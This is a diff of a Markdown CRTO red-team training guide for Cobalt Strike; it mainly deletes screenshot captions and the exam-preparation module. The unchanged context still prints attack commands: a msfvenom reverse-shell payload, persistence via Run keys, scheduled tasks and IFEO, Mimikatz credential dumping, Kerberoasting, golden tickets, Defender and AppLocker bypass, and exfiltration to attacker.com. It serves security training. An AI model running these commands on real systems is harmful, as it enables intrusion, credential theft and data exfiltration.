@@ -41,8 +41,7 @@
 | **25** | [Defender Evasion](#module-25-defender-evasion) | Signatures, behavioral bypass |
 | **26** | [Application Whitelisting](#module-26-application-whitelisting) | AppLocker, WDAC bypass |
 | **27** | [Data Hunting & Exfiltration](#module-27-data-hunting--exfiltration) | Discovery, channels, cleanup |
-| **28** | [Extending Cobalt Strike](#module-28-extending-cobalt-strike) | BOF, Aggressor, custom tools |
-| **29** | [Exam Preparation](#module-29-exam-preparation) | Strategy, checklist, timing |
+| **28** | [Extending Cobalt Strike](#module-28-extending-cobalt-strike) | BOF, Aggressor, custom tools 
 
 ---
 
@@ -144,8 +143,7 @@ sudo ./teamserver 192.168.1.100 SecurePassword ./http.profile
 # Login with: Server IP, username, password
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike GUI showing successful Team Server connection. Left panel displays "Connected" status, Team Server IP (192.168.1.100), and current user authentication. Main console shows "Ready for beacon callbacks" message.*
+
 
 ---
 
@@ -216,8 +214,7 @@ cd /opt/cobaltstrike
 # [+] Ready for delivery
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike Packages dialog showing Windows EXE generation. Listener dropdown showing "HTTP-Primary" selected, output format set to "EXE". File saved dialog with beacon.exe highlighted.*
+
 
 ### Setting Up Listeners
 
@@ -237,8 +234,7 @@ LISTENER SETUP:
 └─────────────────────────────────────────┘
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike Listeners panel showing multiple active listeners: HTTP-Primary (80), HTTPS-Backup (443), DNS-Tunnel (53). Status shows "Active" for all. Right-side panel shows listener configuration details.*
+
 
 ---
 
@@ -284,8 +280,7 @@ curl -I https://example.com
 # Results: 15 services exposed
 ```
 
-**Screenshot Description:**
-> *Shodan search results page showing example.com infrastructure. Visible services include IIS 10.0 on port 80, Windows Server 2016, multiple exposed ports (80, 443, 8080, 3389). Vulnerability section shows outdated software versions.*
+
 
 ### Finding Entry Points
 
@@ -360,8 +355,7 @@ EOF
 #     2FA Token: 123456
 ```
 
-**Screenshot Description:**
-> *Evilginx2 console showing captured sessions. Session #1 displays victim email (target@example.com), timestamp of capture (2024-07-04 14:32:15), and credential confirmation status. Browser shows fake Microsoft login page with real certificate.*
+
 
 ### Malicious Document Delivery
 
@@ -387,8 +381,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=redirector.com LPORT=443 \
 # Email to target distribution list
 ```
 
-**Screenshot Description:**
-> *Microsoft Word document with enabled macros dialog box visible. Content shows fake salary review document. When opened, macro silently executes and beacon callback initiates. Cobalt Strike Beacons tab shows new beacon (ID: 1) connecting from external IP 203.0.113.55 with hostname DESKTOP-ABC123, user jane.doe.*
+
 
 ### Initial Callback Verification
 
@@ -407,8 +400,7 @@ BEACON CALLBACK CONFIRMATION:
 └────────────────────────────────────────┘
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike Beacons tab with first successful callback. Beacon information panel shows all details listed above. Process tree shows winword.exe as parent process. Operator console ready to input commands.*
+
 
 ---
 
@@ -458,8 +450,7 @@ shell Get-MpComputerStatus
 # AntivirusSignatureVersion : 1.405.14.0
 ```
 
-**Screenshot Description:**
-> *Beacon console showing output of reconnaissance commands. systeminfo output prominently displays OS version, missing security patches (highlighted in red), and installed software. ipconfig shows network configuration with internal gateway 192.168.1.1. Windows Defender status shows enabled with real-time protection active.*
+
 
 ### Network Enumeration
 
@@ -490,8 +481,6 @@ shell route print
 # 0.0.0.0        0.0.0.0          192.168.1.1     192.168.1.105
 ```
 
-**Screenshot Description:**
-> *Beacon console showing netstat output. Connections visible to domain controllers (port 389 LDAP), DNS servers (port 53), and external resolved domains. ARP table reveals critical infrastructure IPs. Routing table shows VPN tunnel to 10.0.0.0/16 network segment.*
 
 ---
 
@@ -520,8 +509,7 @@ shell reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 # 6. New beacon from same host (beacon should auto-reconnect)
 ```
 
-**Screenshot Description:**
-> *Registry Editor showing HKCU\Software\Microsoft\Windows\CurrentVersion\Run key with malicious "Windows Update" entry pointing to C:\temp\beacon.exe. Value type shows REG_SZ. In parallel, Cobalt Strike shows beacon disconnection and reconnection after simulated reboot. Timestamps show 14:35:10 (disconnect) and 14:37:22 (reconnect).*
+
 
 ### Scheduled Task Persistence
 
@@ -545,13 +533,7 @@ shell schtasks /run /tn "Windows Defender Database Update"
 shell schtasks /query /v | findstr "SYSTEM"
 ```
 
-**Screenshot Description:**
-> *Task Scheduler GUI showing new scheduled task "Windows Defender Database Update". Properties tab displays:*
-> - *Trigger: At logon (any user)*
-> - *Action: Execute C:\temp\beacon.exe*
-> - *Run with highest privileges: Enabled*
-> - *Run whether user logged in or not: Enabled*
-> *Parallel Cobalt Strike console shows task execution with beacon callback from SYSTEM context.*
+
 
 ### WMI Event Subscription Persistence
 
@@ -573,8 +555,6 @@ shell Get-WmiObject -Namespace root\subscription -Class __EventFilter | select N
 # UpdateFilter
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing WMI event filter creation command. Output shows successful filter creation. WMI Repository shows active event subscription with filter and consumer bound together. Persistent execution verified after system reboot.*
 
 ---
 
@@ -618,8 +598,7 @@ shell whoami /priv
 # [Total of 39 privileges] ← Significantly more than before
 ```
 
-**Screenshot Description:**
-> *Before and after privilege escalation comparison. Left side shows original jane.doe user in Cobalt Strike. Right side shows identical machine now running as NT AUTHORITY\SYSTEM. Beacon window title bar displays new user context. whoami /priv output shows 39 elevated privileges including SeDebugPrivilege and SeImpersonatePrivilege.*
+
 
 ### Kernel Exploit Privilege Escalation
 
@@ -652,8 +631,7 @@ shell whoami
 # NT AUTHORITY\SYSTEM
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike console showing kernel exploit execution. systeminfo output visible with OS version and patch level. KernelExploit.exe execution output shows vulnerability detection and successful exploitation. Final whoami output confirms SYSTEM privileges achieved. Process window shows explorer.exe now running as SYSTEM context.*
+
 
 ---
 
@@ -685,8 +663,7 @@ shell reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Ex
 # All can be triggered before Windows logon!
 ```
 
-**Screenshot Description:**
-> *Registry Editor open showing IFEO entry for stickykeys.exe. Debugger value shows C:\temp\beacon.exe. Lock screen visible in background showing accessibility button. Cobalt Strike shows new SYSTEM beacon from same machine after stickykeys trigger. Timeline shows: 14:42:33 (IFEO registry modification) → 14:42:45 (accessibility button clicked) → 14:42:48 (new SYSTEM beacon appears).*
+
 
 ### Alternate Data Streams (ADS) Hiding
 
@@ -714,8 +691,6 @@ shell dir /R C:\Windows\System32\drivers\etc
 #                    ^^ Alternate Data Stream revealed
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing ADS creation and execution commands. First dir command shows only hosts file (beacon hidden). Second dir /R command reveals beacon.exe in alternate data stream. Process list shows powershell.exe executing beacon.exe from ADS. File Explorer cannot see beacon.exe even with "show hidden files" enabled - proving ADS stealth.*
 
 ### COM Object Hijacking
 
@@ -735,8 +710,6 @@ shell reg add "HKCU\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111
 shell Get-Process | Where-Object {$_.Modules.FileName -match "malicious.dll"}
 ```
 
-**Screenshot Description:**
-> *Registry Editor showing CLSID structure. Legitimate COM entry in HKLM redirected by user-level entry in HKCU pointing to malicious.dll. Process Monitor capture shows malicious.dll being loaded when COM object instantiated. DLL injection confirmed in process tree.*
 
 ---
 
@@ -773,8 +746,6 @@ execute-assembly /opt/tools/Mimikatz.exe '"sekurlsa::minidump lsass.dmp" "sekurl
 #     * Hash NTLM : 209c6174da490caeb422f3fa5a7ae634
 ```
 
-**Screenshot Description:**
-> *ProcdumpOutput showing lsass.dmp file created successfully (276 KB). Mimikatz console showing extracted credentials from dump. Administrator account plaintext password visible: "MyS3cur3P@ssw0rd!". NTLM hash also displayed for offline cracking. Credentials can now be used for lateral movement.*
 
 ### Browser Credential Extraction
 
@@ -800,8 +771,7 @@ execute-assembly /opt/tools/Mimikatz.exe '"dpapi::chrome"'
 # Token: ghp_xxxxxxxxxxxxxxxxxxxx (GitHub PAT)
 ```
 
-**Screenshot Description:**
-> *Mimikatz chrome decryption output showing multiple website credentials in plaintext. Visible entries include example.com admin account, Gmail credentials, and GitHub personal access token. Each credential categorized by website origin URL.*
+
 
 ### Credential Manager Extraction
 
@@ -834,8 +804,6 @@ execute-assembly /opt/tools/VaultPasswordView.exe
 # Password: SQL_P@ssw0rd123!
 ```
 
-**Screenshot Description:**
-> *VaultPasswordView.exe output showing extracted credentials from Windows Credential Manager. Three credential sets visible: VPN user, RDP administrator, and database SA account with their respective passwords. Credentials are in plaintext after extraction from vault.*
 
 ---
 
@@ -870,8 +838,6 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 # Time.Elapsed..: 8m 35s
 ```
 
-**Screenshot Description:**
-> *Terminal window showing Hashcat execution in progress. Progress bar showing 95% complete with hash rate 1.8 MH/s. Cracking time estimate: ~2 minutes remaining. Output file shows first three cracked hashes with plaintext passwords.*
 
 ### Kerberoast Hash Cracking
 
@@ -889,8 +855,7 @@ hashcat -m 13100 kerb_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.
 # Time remaining: ~6 minutes
 ```
 
-**Screenshot Description:**
-> *Hashcat terminal showing Kerberoast cracking. Hash mode 13100 displayed. Cracking in progress with 3 successful cracks: svcadmin, sqlservice, and webserver accounts with their respective passwords. Success rate and time estimate shown at bottom.*
+
 
 ---
 
@@ -936,8 +901,6 @@ Get-DomainUser -SPN
 # exchangeservice   exchangeMDB/EX1.example.com
 ```
 
-**Screenshot Description:**
-> *PowerView output showing domain structure. Forest and domain names displayed with SID. Domain controllers listed with IP addresses. User enumeration showing group memberships. Service accounts with SPNs highlighted for Kerberoasting potential.*
 
 ### Trust Relationship Mapping
 
@@ -956,8 +919,6 @@ Get-DomainTrust
 # External = separate forest (harder to exploit)
 ```
 
-**Screenshot Description:**
-> *Domain trust visualization showing example.com as root with child.example.com and eu.example.com as child domains. External trust to partner.com shown separately. Visual representation shows bidirectional trust arrows. Trust type labels (Transitive/External) visible on each connection.*
 
 ---
 
@@ -998,8 +959,7 @@ shell ls \\DC1\C$
 # [pagefile.sys]
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike console showing token list output. Multiple user tokens visible with delegation/impersonation levels. After impersonation, whoami output shows "example\administrator". Following access to DC share (C$) succeeds, proving impersonation worked.*
+
 
 ### Token Theft from Running Process
 
@@ -1028,8 +988,6 @@ shell whoami /priv
 # [35 total privileges]
 ```
 
-**Screenshot Description:**
-> *Beacon console showing tasklist output with svchost.exe process running as SYSTEM (PID 772). steal_token command executed. Following whoami shows NT AUTHORITY\SYSTEM. whoami /priv output shows extended privilege set including SeDebugPrivilege.*
 
 ---
 
@@ -1060,8 +1018,6 @@ jump psremoting server2.example.com http
 #   IP: 192.168.1.106
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike console showing jump command to server2.example.com. Status messages show "Lateral movement in progress" and "New beacon spawning". Beacons tab shows two active beacons: original (ID:1, DESKTOP-ABC123) and new (ID:3, SERVER2). Both active and responding to commands.*
 
 ### SMB Lateral Movement
 
@@ -1087,8 +1043,7 @@ shell wmic /node:server2 /user:domain\user /password:pass process call create "C
 # User: NT AUTHORITY\SYSTEM (WMI execution context)
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing successful SMB access test to server2. Copy command executes successfully. WMI process creation shows process ID 2456. Cobalt Strike Beacons tab shows new beacon from SERVER2 running as SYSTEM. Process tree shows wmic.exe spawning beacon.exe.*
+
 
 ---
 
@@ -1121,8 +1076,6 @@ shell C:\temp\meterpreter.exe
 # - Meterpreter (Metasploit) for compatibility
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike GUI showing beacon export menu option selected. Metasploit terminal showing successful Meterpreter callback. Sessions list shows "1 session: meterpreter/windows/x64 - EXAMPLE\jane.doe@SERVER1". Both C2 frameworks controlling same target machine.*
 
 ---
 
@@ -1162,8 +1115,6 @@ execute-assembly Mimikatz.exe '"dpapi::lsa"'
 # Password: Admin@Password123!
 ```
 
-**Screenshot Description:**
-> *File Explorer showing DPAPI master key directory structure. S-1-5-... SID folder visible. Multiple master key files displayed with GUID names. Mimikatz dpapi::lsa output showing decrypted vault secrets with RDP server, username, and password in plaintext.*
 
 ---
 
@@ -1195,8 +1146,6 @@ Get-DomainUser -SPN
 # $krb5tgs$23$*svcadmin$EXAMPLE.COM$MSSQLSvc/sql1.example.com:1433*$...
 ```
 
-**Screenshot Description:**
-> *Rubeus.exe executing kerberoast function. Output shows two service accounts found (svcadmin, webservice) with their SPNs. TGS tickets requested and saved to file. Hash format showing RC4-HMAC encryption (weaker than AES, easier to crack).*
 
 ### Crack Kerberoast Hashes
 
@@ -1213,8 +1162,7 @@ hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule
 # webservice: WebApp@2024!
 ```
 
-**Screenshot Description:**
-> *Hashcat terminal showing Kerberoast hash cracking progress. Wordlist (rockyou.txt) and best64 rules applied. Two successful cracks displayed with plaintext passwords for svcadmin and webservice accounts.*
+
 
 ---
 
@@ -1246,8 +1194,7 @@ proxychains nmap -sV 10.0.0.0/24 -p 80,443,3389 --open
 # Discover new internal targets via pivoting
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike right-click menu showing "Pivot → SOCKS Server" option selected. Status message shows "SOCKS server listening on 127.0.0.1:1080". Proxychains configuration file open in text editor. Nmap output showing internal network discovery results from pivoting through beacon.*
+
 
 ---
 
@@ -1280,8 +1227,7 @@ openssl pkcs12 -export -in cert.pem -out cert.pfx -certfile cacert.crt
 # Enter Export Password: (set password)
 ```
 
-**Screenshot Description:**
-> *Certify.exe output showing vulnerable template "User-Enrollment" discovered. Vulnerability flags highlighted: ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME and AUTOENROLLMENT_ALLOWED. Certificate request output showing "Certificate issued!" Status changes from pending to issued. cert.pem file created.*
+
 
 ---
 
@@ -1317,8 +1263,7 @@ gpupdate /force /target:computer
 # All users logging into machines in that OU execute beacon.exe as SYSTEM
 ```
 
-**Screenshot Description:**
-> *Group Policy Management Editor showing newly created "Security Update" GPO. Scheduled Tasks configuration panel open. Task creation dialog showing "Windows Update Service" name pointing to C:\temp\beacon.exe with SYSTEM privileges. Final result shows beacons appearing from multiple machines in OU simultaneously.*
+
 
 ---
 
@@ -1354,8 +1299,7 @@ sqlcmd -S sql1.example.com -U sa -P password
 # New beacon appears from SQL server context
 ```
 
-**Screenshot Description:**
-> *SQL Server Management Studio showing connection to sql1.example.com. T-SQL commands visible in editor: sp_configure statements enabling xp_cmdshell. New beacon appears in Cobalt Strike from SQL server with context showing SQL service account. Lateral movement successful.*
+
 
 ---
 
@@ -1385,8 +1329,7 @@ Set-CMPackageDistribution -PackageName "Security Hotfix" -DeploymentTarget "All 
 # (15 minutes default)
 ```
 
-**Screenshot Description:**
-> *System Center Configuration Manager console open. Packages section showing new "Security Hotfix" package. Deployment status showing "Deployed to 847 clients". Timeline shows: 15:30 (package created) → 15:45 (deployed) → 16:00 (847 beacons reporting back). Massive parallel beacon callback.*
+
 
 ---
 
@@ -1428,8 +1371,6 @@ shell ls \\DC1\c$
 # 08/04/2024  14:30    <DIR>  Program Files
 ```
 
-**Screenshot Description:**
-> *Cobalt Strike console showing domain group membership. "Domain Admins" group now includes our compromised user (jane.doe). Following command successfully lists DC1 C$ share, proving DA access. Process Monitor shows activities running in SYSTEM context from our beacon.*
 
 ---
 
@@ -1475,8 +1416,6 @@ shell ls \\root-dc.example.com\c$
 # [Successfully accessed - forest compromised!]
 ```
 
-**Screenshot Description:**
-> *Rubeus.exe command showing golden ticket creation with SID history injection. Output shows ticket created and injected. Following ls command to root-dc.example.com\c$ succeeds, proving forest root access. Combined timeline shows: 14:30 (child DA obtained) → 14:35 (krbtgt hash dumped) → 14:40 (golden ticket created) → 14:42 (forest root DC accessed).*
 
 ---
 
@@ -1504,8 +1443,7 @@ $cred = New-PSCredential -UserName "administrator" -Password (ConvertTo-SecureSt
 Invoke-Command -ComputerName WS001 -Credential $cred -ScriptBlock { whoami /priv }
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing Get-ADComputer output with LAPS password column. LAPS password displayed in plaintext (g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)). Following Invoke-Command executes on WS001 as local administrator, proving LAPS extraction successful.*
+
 
 ---
 
@@ -1539,8 +1477,6 @@ copy C:\temp\beacon.exe C:\Windows\System32\beacon.exe
 Set-MpPreference -DisableRealtimeMonitoring $false
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing Defender status before/after bypass. RealTimeProtectionEnabled changes from True to False. File copy of beacon.exe succeeds without detection alerts. Task Manager shows beacon.exe running without quarantine or alerts.*
 
 ---
 
@@ -1572,8 +1508,6 @@ copy C:\temp\beacon.ps1 "C:\Program Files\Common Files\beacon.ps1"
 cscript.exe C:\Windows\System32\WScript.Host "C:\Program Files\Common Files\beacon.ps1"
 ```
 
-**Screenshot Description:**
-> *Command prompt showing mshta execution bypassing AppLocker. PowerShell indirectly loads through mshta (allowed). Process tree shows mshta.exe → powershell.exe → beacon.exe execution. Cobalt Strike shows new beacon from machine with AppLocker enabled, proving bypass successful.*
 
 ---
 
@@ -1601,8 +1535,7 @@ Get-ChildItem -Recurse | Select-String -Pattern "password\s*=|pwd\s*=|secret\s*=
 # app.config:67:sql_password=DataB@se123!
 ```
 
-**Screenshot Description:**
-> *PowerShell output showing sensitive files found: Q3_Financial_Results.xlsx, Customer_List_2024.docx, Acquisition_Plan_CONFIDENTIAL.pdf. File search results highlighted showing configuration files with embedded credentials and API keys.*
+
 
 ### Data Exfiltration
 
@@ -1620,8 +1553,7 @@ Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body @{data=$ba
 # nslookup <base64_encoded_data>.attacker.com
 ```
 
-**Screenshot Description:**
-> *PowerShell console showing file compression of confidential data. Zip file created (125 MB). HTTP POST request to attacker server shows successful data transfer (100%). Alternative shows DNS queries with encoded data being sent to attacker-controlled nameserver. Data successfully exfiltrated.*
+
 
 ---
 
@@ -1665,171 +1597,11 @@ void go(char * args, int len) {
 }
 ```
 
-**Screenshot Description:**
-> *Visual Studio Code showing custom BOF source code. Beacon.h header file visible. Compilation command shown in terminal. Generated .o object file displayed. Cobalt Strike showing custom BOF loaded and executed, displaying process enumeration output.*
+
 
 ---
 
-## MODULE 29: Exam Preparation
 
-### Exam Strategy & Methodology
-
-**24-hour hands-on red team operation assessment:**
-
-```
-CRTO EXAM STRUCTURE:
-┌──────────────────────────────────────────────────┐
-│ Duration: 24 hours                              │
-│ Objectives: ~5 primary goals (confidential)     │
-│ Environment: 5-10 machines, fully patched       │
-│ Defenses: Windows Defender, EDR, firewalls     │
-│ Reporting: Technical write-up required          │
-│ Success Criteria: All objectives + clean report │
-└──────────────────────────────────────────────────┘
-
-RECOMMENDED TIME ALLOCATION:
-0-2 hours    : Setup, reconnaissance, planning
-2-6 hours    : Initial compromise
-6-10 hours   : Persistence & privilege escalation
-10-16 hours  : Domain exploitation
-16-20 hours  : Lateral movement & additional objectives
-20-22 hours  : Data collection & cleanup
-22-24 hours  : Report writing & evidence gathering
-```
-
-### Pre-Exam Checklist
-
-```
-INFRASTRUCTURE SETUP:
-☐ Team Server compiled and running
-☐ Redirector(s) deployed (separate IPs)
-☐ C2 profiles tested and optimized
-☐ Listener(s) configured and verified
-☐ Kali tools updated and verified
-☐ Custom BOF/scripts loaded into Aggressor
-☐ Note-taking tool open (OneNote, CherryTree)
-☐ Screenshot tool ready (ShareX, Flameshot)
-
-OPERATIONAL SECURITY:
-☐ VPN properly configured with kill-switch
-☐ All traffic routed through redirector
-☐ Sleep timers set (no instantaneous callbacks)
-☐ Artifact cleanup scripts ready
-☐ Log monitoring tools active
-☐ Detection evasion confirmed working
-☐ Alternative C2 options ready (backup)
-
-DOCUMENTATION:
-☐ Empty lab notebook ready
-☐ Screenshot template prepared
-☐ Command log format established
-☐ Report template drafted
-☐ Objective tracking sheet created
-```
-
-### Attack Execution Roadmap
-
-```
-PHASE 1: INITIAL ACCESS (Hours 0-6)
-├── Reconnaissance (passive OSINT)
-├── Target identification
-├── Phishing campaign deployment
-├── Wait for callback (or trigger manually if needed)
-├── Take control of initial machine
-└── Screenshot: Initial beacon callback with hostname/user
-
-PHASE 2: FOOTHOLD ESTABLISHMENT (Hours 6-10)
-├── Enumerate system and network
-├── Establish persistence (multiple methods)
-├── Escalate privileges (if not already System)
-├── Reboot test (verify persistence)
-├── Screenshot: System privileges with persistence confirmed
-
-PHASE 3: DOMAIN RECONNAISSANCE (Hours 10-14)
-├── Identify Domain Controllers
-├── Enumerate users, groups, shares
-├── Identify attack vectors (Kerberoastable, delegates, etc.)
-├── Run AD enumeration tools (BloodHound, PowerView)
-├── Create detailed attack plan
-└── Screenshot: Domain structure with attack paths identified
-
-PHASE 4: DOMAIN COMPROMISE (Hours 14-20)
-├── Execute primary attack (Kerberoasting, delegation, ACL abuse, etc.)
-├── Achieve Domain Admin access
-├── Establish persistence in domain (Golden Ticket, DSRM, etc.)
-├── Access all Domain Controllers
-├── Achieve Enterprise Admin (if multi-domain)
-└── Screenshot: DC access with DA context
-
-PHASE 5: CLEANUP & REPORTING (Hours 20-24)
-├── Review all actions for detection indicators
-├── Remove command history, log entries
-├── Remove created accounts/groups
-├── Delete temporary files
-├── Verify cleanup completeness
-├── Compile screenshots with detailed captions
-├── Write technical report
-└── Final submission
-```
-
-### Documentation Requirements
-
-**Each objective must include:**
-1. **Screenshot proof** (whoami, hostname, target resource access)
-2. **Command sequence** (exact commands executed in order)
-3. **Output evidence** (relevant console output)
-4. **Explanation** (why this attack worked)
-5. **Detection indicators** (what would blue team see)
-6. **Mitigation** (how to prevent this attack)
-
-**Example Report Section:**
-> **Objective: Achieve Domain Administrator Access**
->
-> **Approach:** Kerberoasting → Password Cracking → Service Account Compromise
->
-> **Commands:**
-> ```
-> .\Rubeus.exe kerberoast /outfile:kerb.txt
-> hashcat -m 13100 kerb.txt rockyou.txt
-> .\Rubeus.exe asktgt /user:svcadmin /aes256:<HASH> /ptt
-> ```
-> 
-> **Proof:** [Screenshot showing Domain Admins group membership]
->
-> **Impact:** Full domain control, credential access, lateral movement capability
-
----
-
-## Final Checklist
-
-### Pre-Exam Day
-- [ ] Sleep well (well-rested mind)
-- [ ] Test VPN connection
-- [ ] Verify all tools accessible
-- [ ] Check redirector status
-- [ ] Backup all scripts/payloads
-- [ ] Clear mind of distractions
-
-### During Exam
-- [ ] Document EVERYTHING
-- [ ] Take screenshots at each milestone
-- [ ] Keep detailed timeline
-- [ ] Don't rush - enumerate thoroughly
-- [ ] Multiple persistence methods
-- [ ] Regular artifact cleanup
-- [ ] Test connectivity regularly
-- [ ] Screenshot proof regularly
-
-### Post-Exam
-- [ ] Comprehensive report
-- [ ] Clear, professional formatting
-- [ ] Every screenshot captioned
-- [ ] Technical depth and clarity
-- [ ] Mitigation recommendations
-- [ ] Objective completion proof
-- [ ] Submit within deadline
-
----
 
 ## Conclusion
 
@@ -1854,7 +1626,8 @@ Good luck with your red team operations.
 
 ---
 
-**Author:** DarcHacker  
-**LinkedIn:** https://www.linkedin.com/in/mostafa-ibrahim-60b543341  
-**Last Updated:** 2026-07-04  
-**Document Status:** Complete & Ready for Reference
+CRTO | Zero Point Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”
+
+By DarcHacker.
+
+LinkedIn:www.linkedin.com/in/mostafa-ibrahim-60b543341
